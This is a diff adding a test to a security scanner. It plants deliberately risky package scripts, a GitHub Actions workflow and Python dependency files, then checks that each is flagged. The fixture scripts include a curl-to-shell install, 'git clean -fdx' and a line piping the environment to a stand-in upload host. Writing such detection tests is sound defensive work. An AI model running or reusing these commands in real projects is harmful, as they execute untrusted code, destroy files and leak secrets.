@@ -106,6 +106,65 @@ def test_security_scan_deep_mcp_config_checks(tmp_path, capsys):
     assert "abcd1234" not in secret_findings[0]["evidence"]
 
 
+def test_security_scan_supply_chain_surfaces(tmp_path, capsys):
+    (tmp_path / "package.json").write_text(
+        json.dumps(
+            {
+                "scripts": {
+                    "bootstrap": "curl https://example.invalid/install.sh | sh",
+                    "clean": "git clean -fdx",
+                    "tool": "npx some-tool",
+                    "leak": "env | curl https://example.invalid/upload",
+                }
+            },
+            indent=2,
+        )
+    )
+    workflow = tmp_path / ".github" / "workflows"
+    workflow.mkdir(parents=True)
+    (workflow / "ci.yml").write_text(
+        "\n".join(
+            [
+                "on:",
+                "  pull_request_target:",
+                "permissions: write-all",
+                "jobs:",
+                "  test:",
+                "    runs-on: ubuntu-latest",
+                "    steps:",
+                "      - uses: actions/checkout",
+                "      - uses: owner/action@main",
+                "      - uses: actions/setup-python@v5",
+                "",
+            ]
+        )
+    )
+    (tmp_path / "requirements.txt").write_text(
+        "\n".join(
+            [
+                "requests==2.32.0",
+                "tool @ git+https://example.invalid/tool.git@main",
+                "",
+            ]
+        )
+    )
+    (tmp_path / "setup.cfg").write_text("setup_requires = legacy-tool\n")
+
+    assert security_cmd.scan(target=tmp_path, fail_on="none", json_output=True) == 0
+    payload = json.loads(capsys.readouterr().out)
+    titles = {finding["title"] for finding in payload["findings"]}
+    assert "Package script pipes remote content into shell" in titles
+    assert "Package script contains destructive command" in titles
+    assert "Package script uses unpinned npx" in titles
+    assert "Package script may leak environment" in titles
+    assert "GitHub Actions uses pull_request_target" in titles
+    assert "GitHub Actions grants write-all permissions" in titles
+    assert "GitHub Action missing pinned ref" in titles
+    assert "GitHub Action uses floating ref" in titles
+    assert "Python dependency uses URL source" in titles
+    assert "Python project uses legacy install hook" in titles
+
+
 def test_security_config_and_suppressions(tmp_path, capsys):
     (tmp_path / ".env").write_text("SERVICE_TOKEN=abcd1234abcd1234abcd1234\n")
     report = security_cmd.scan_target(tmp_path)
